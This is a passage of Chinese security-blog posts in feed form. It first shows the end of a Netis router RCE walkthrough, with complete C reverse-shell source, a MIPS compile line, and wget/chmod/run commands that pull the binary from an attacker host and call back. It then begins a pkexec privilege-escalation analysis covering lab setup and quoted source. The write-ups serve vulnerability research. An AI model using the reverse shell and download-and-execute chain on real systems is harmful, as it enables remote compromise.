shell</p>\n<p>但是有 <code>wget</code>  下载恶意程序并运行</p>\n<p>编写恶意程序 <code>malware</code>  (✨TODO 修改参数)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> port = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ip = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">sin</span> =</span> &#123;</span><br><span class=\"line\">\t\t.sin_family = AF_INET,</span><br><span class=\"line\">\t\t.sin_port = htons(port),</span><br><span class=\"line\">\t\t.sin_addr.s_addr = inet_addr(ip),</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tconnect(sd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;<span class=\"built_in\">sin</span>, <span class=\"keyword\">sizeof</span>(<span class=\"built_in\">sin</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> _ = <span class=\"number\">0</span>; _ &lt;= <span class=\"number\">2</span>; _++) </span><br><span class=\"line\">\t\tdup2(sd, _);</span><br><span class=\"line\">\texecl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mips-linux-gnu-gcc -static -mabi=32 -o malware malware.c</span><br></pre></td></tr></table></figure>\n<p>我们需要利用两次漏洞 一次让 malware 可执行 一次让其跑起来（因为长度不够 没法一次性解决）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://10.10.10.2:8000/malware</span><br><span class=\"line\">chmod +x malware</span><br><span class=\"line\">./malware 10.10.10.2 9999</span><br></pre></td></tr></table></figure>\n<p>攻击机开启监听<br>\n效果如下 成功 getshell<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719182949.png\" alt></p>\n<h2 id=\"未完\"><a class=\"markdownIt-Anchor\" href=\"#未完\">#</a> 未完</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  squrootfs grep -r &quot;Authorization: Basic &quot; .</span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">➜  squrootfs grep -r &quot;User-Agent: Real UserAgent&quot; .</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">➜  squrootfs grep -r &quot;User-Agent: &quot; .              </span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "IoT"
            ]
        },
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "url": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "title": "CVE-2021-4030 polkit-pkexec 本地提权分析",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"参考\"><a class=\"markdownIt-Anchor\" href=\"#参考\">#</a> 参考</h2>\n<ul>\n<li><a href=\"https://bbs.pediy.com/thread-271423.htm\">看雪大爹</a></li>\n<li><a href=\"https://trganda.github.io/posts/iconv/\">GCONV_PATH 利用</a></li>\n<li><a href=\"https://blog.csdn.net/qq_42303523/article/details/117911859#:~:text=linux%E7%B3%BB%E7%BB%9F%E6%8F%90,%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%A6%82%E4%B8%8B%EF%BC%9A\">GCONV_PATH 利用 2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/470224218?utm_source=qq&amp;utm_medium=social&amp;utm_oi=949109417673797632\">合天</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2MTY0MDc1Mw==&amp;mid=2247484520&amp;idx=1&amp;sn=b9fdfa0c5cc802478a541964a0d5b2c2&amp;chksm=ce154536f962cc20db00097e2b0f4cc155aefb25e54dbc31af29733be6ecf9ba21d3fd77b908&amp;mpshare=1&amp;scene=23&amp;srcid=0301ZZXX7YvmTLBFW02HGXd5&amp;sharer_sharetime=1646130648823&amp;sharer_shareid=35c6bdd49b9ea011edbc171a217d1072#rd\">天玄实验室</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/267774#h3-2\">安全客</a></li>\n<li><a href=\"https://www.wt37.cn/5949.html\">少羽</a></li>\n</ul>\n<h2 id=\"软件简介\"><a class=\"markdownIt-Anchor\" href=\"#软件简介\">#</a> 软件简介</h2>\n<p><a href=\"https://gitlab.freedesktop.org/polkit/polkit/\">https://gitlab.freedesktop.org/polkit/polkit/</a></p>\n<blockquote>\n<p>polkit is a toolkit for defining and handling authorizations. It is used for allowing unprivileged processes to speak to privileged processes.</p>\n</blockquote>\n<p>pkexec 是 polkit 是一个程序，polkit 负责不同特权级的进程间的通讯<br>\n <code>pkexec echo &quot;1&quot;</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --help</span><br><span class=\"line\">pkexec --version |</span><br><span class=\"line\">       --help |</span><br><span class=\"line\">       --disable-internal-agent |</span><br><span class=\"line\">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class=\"line\"></span><br><span class=\"line\">See the pkexec manual page for more details.</span><br></pre></td></tr></table></figure>\n<h2 id=\"环境\"><a class=\"markdownIt-Anchor\" href=\"#环境\">#</a> 环境</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --version</span><br><span class=\"line\">pkexec version 0.105</span><br><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ uname -a</span><br><span class=\"line\">Linux squ-virtual-machine 5.11.0-46-generic #51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>\n<p>docker：<br>\npull 个 debian 下来，然后设置共享卷</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --name=de -v /home/squ/docker_volumn:/home/vol debian /bin/bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"下载源码\"><a class=\"markdownIt-Anchor\" href=\"#下载源码\">#</a> 下载源码</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/policykit-1-0.105$ dpkg -S /usr/bin/pkexec</span><br><span class=\"line\">policykit-1: /usr/bin/pkexec</span><br></pre></td></tr></table></figure>\n<p><code>dpkg</code>  查看包为 <code>policykit-1</code> <br>\n <code>sudo apt source policykit-1</code>  或者<br>\n<a href=\"https://launchpad.net/ubuntu/bionic/+package/policykit-1\"> https://launchpad.net/ubuntu/bionic/+package/policykit-1</a><br>\n 影响版本 <code>0~0.105</code></p>\n<p>下载后路径在 <code>/home/squ/Desktop/cve/policykit-1-0.105/src/programs/pkexec.c</code></p>\n<h2 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>源码地址<br>\n<a href=\"https://gitlab.freedesktop.org/polkit/polkit\"> https://gitlab.freedesktop.org/polkit/polkit</a><br>\n 基本找个虚拟机就能打，真是太 coooooooooooooooooooooooooooool 了<br>\n docker<br>\n 如果遇到了 <code>hash mismatch</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E: Failed to fetch http:<span class=\"comment\">//deb.debian.org/debian/pool/main/b/binutils/binutils-common_2.35.2-2_amd64.deb  Hash Sum mismatch</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get clean  </span><br><span class=\"line\">apt-get update --fix-missing </span><br></pre></td></tr></table></figure>\n<p>如果还是不行就换源 <code>/etc/apt/sources.list</code> (debian)<br>\n 再不行就关代理吧（关了就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>里面有一个 <code>INSTALL</code>  的文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libc6-dev</span><br><span class=\"line\">apt install gobjc++</span><br><span class=\"line\">./configure CC=c99 CFLAGS=-g LIBS=-lposix</span><br></pre></td></tr></table></figure>\n<p>遇到问题</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking whether the C compiler works... no</span><br><span class=\"line\">configure: error: in `/home/vol/policykit<span class=\"number\">-1</span><span class=\"number\">-0.105&#x27;</span>:</span><br><span class=\"line\">configure: error: C compiler cannot create executables</span><br></pre></td></tr></table></figure>\n<p>看 <code>config.log</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure:<span class=\"number\">3355</span>: $? = <span class=\"number\">1</span></span><br><span class=\"line\">configure:<span class=\"number\">3375</span>: checking whether the C compiler works</span><br><span class=\"line\">configure:<span class=\"number\">3397</span>: /usr/bin/gcc -g   conftest.c -lposix &gt;&amp;<span class=\"number\">5</span></span><br><span class=\"line\">/usr/bin/ld: cannot find -lposix</span><br><span class=\"line\">collect2: error: ld returned <span class=\"number\">1</span> <span class=\"built_in\">exit</span> status</span><br></pre></td></tr></table></figure>\n<p>安装库</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install manpages-posix-dev\t</span><br></pre></td></tr></table></figure>\n<p>也没用，索性不加 <code>posix</code>  试试看</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure CC=c99 CFLAGS=-g <span class=\"comment\">//LIBS=-lposix</span></span><br></pre></td></tr></table></figure>\n<p>继续报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: The pkg-config script could not be found or is too old.  Make sure it</span><br><span class=\"line\">is in your PATH or <span class=\"built_in\">set</span> the PKG_CONFIG environment variable to the full</span><br><span class=\"line\">path to pkg-config.</span><br></pre></td></tr></table></figure>\n<p>安装</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y pkg-config</span><br></pre></td></tr></table></figure>\n<p>继续报错</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: Package requirements (gio-2.0 &gt;= 2.28.0) were not met:</span><br><span class=\"line\"></span><br><span class=\"line\">No package &#x27;gio-2.0&#x27; found</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y gio-2.0</span><br></pre></td></tr></table></figure>\n<p>然后又来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/ld: cannot find -lpam</span><br></pre></td></tr></table></figure>\n<p>这是因为缺少 <code>libpam.so</code>  的库，在 debian 系统上，可以这样下载  <code>lib + id-dev</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y libpam-dev</span><br></pre></td></tr></table></figure>\n<p>继续报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking <span class=\"keyword\">for</span> intltool &gt;= <span class=\"number\">0.40</span><span class=\"number\">.0</span>...  found</span><br><span class=\"line\">configure: error: Your intltool is too old.  You need intltool <span class=\"number\">0.40</span><span class=\"number\">.0</span> or later.</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install intltool</span><br></pre></td></tr></table></figure>\n<p>configure 没问题了 make 来了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">polkitagentsession.c:<span class=\"number\">58</span>:<span class=\"number\">10</span>: fatal error: gio/gunixoutputstream.h: No such file or directory</span><br><span class=\"line\">   <span class=\"number\">58</span> | <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;gio/gunixoutputstream.h&gt;</span></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libglib2.0</span><br><span class=\"line\">apt-get install libgio2.0</span><br></pre></td></tr></table></figure>\n<p>还是没用<br>\n发现 <code>gio-unix-2.0*</code>  下面就是 <code>gio</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> -r /usr/include/gio-unix-2.0/gio/ /usr/include/</span><br></pre></td></tr></table></figure>\n<h2 id=\"原理分析\"><a class=\"markdownIt-Anchor\" href=\"#原理分析\">#</a> 原理分析</h2>\n<h3 id=\"数组越界\"><a class=\"markdownIt-Anchor\" href=\"#数组越界\">#</a> 数组越界</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span> <span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  ·······</span><br><span class=\"line\">  <span class=\"type\">const</span> gchar *environment_variables_to_save[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;SHELL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANG&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LINGUAS&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANGUAGE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_COLLATE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_CTYPE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MESSAGES&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MONETARY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_NUMERIC&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_TIME&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_ALL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;TERM&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;COLORTERM&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* By default we don&#x27;t allow running X11 apps, as it does not work in the</span></span><br><span class=\"line\"><span class=\"comment\">     * general case. See</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     *  https://bugs.freedesktop.org/show_bug.cgi?id=17970#c26</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * and surrounding comments for a lot of discussion about this.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * However, it can be enabled for some selected and tested legacy programs</span></span><br><span class=\"line\"><span class=\"comment\">     * which previously used e. g. gksu, by setting the</span></span><br><span class=\"line\"><span class=\"comment\">     * org.freedesktop.policykit.exec.allow_gui annotation to a nonempty value.</span></span><br><span class=\"line\"><span class=\"comment\">     * See https://bugs.freedesktop.org/show_bug.cgi?id=38769 for details.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"string\">&quot;DISPLAY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;XAUTHORITY&quot;</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  GPtrArray *saved_env;</span><br><span class=\"line\">  gchar *opt_user;</span><br><span class=\"line\">  <span class=\"type\">pid_t</span> pid_of_caller;</span><br><span class=\"line\">  gpointer local_agent_handle;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = <span class=\"number\">127</span>;</span><br><span class=\"line\">  authority = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  subject = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  details = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  result = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  action_id = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  saved_env = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  path = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  command_line = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  opt_user = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  local_agent_handle = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* check for correct invocation */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">geteuid</span> () != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;pkexec must be setuid root\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  original_user_name = <span class=\"built_in\">g_strdup</span> (<span class=\"built_in\">g_get_user_name</span> ());</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (original_user_name == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting user name.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((original_cwd = <span class=\"built_in\">g_get_current_dir</span> ()) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting cwd: %s\\n&quot;</span>,</span><br><span class=\"line\">                  <span class=\"built_in\">g_strerror</span> (errno));</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* First process options and find the command-line to invoke. Avoid using fancy library routines</span></span><br><span class=\"line\"><span class=\"comment\">   * that depend on environtment variables since we haven&#x27;t cleared the environment just yet.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  opt_show_help = FALSE;</span><br><span class=\"line\">  opt_show_version = FALSE;</span><br><span class=\"line\">  opt_disable_internal_agent = FALSE;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">1</span>; n &lt; (guint) argc; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--help&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_help = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--version&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_version = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--user&quot;</span>) == <span class=\"number\">0</span> || <span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;-u&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          n++;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (n &gt;= (guint) argc)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (opt_user != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;--user specified twice\\n&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          opt_user = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span 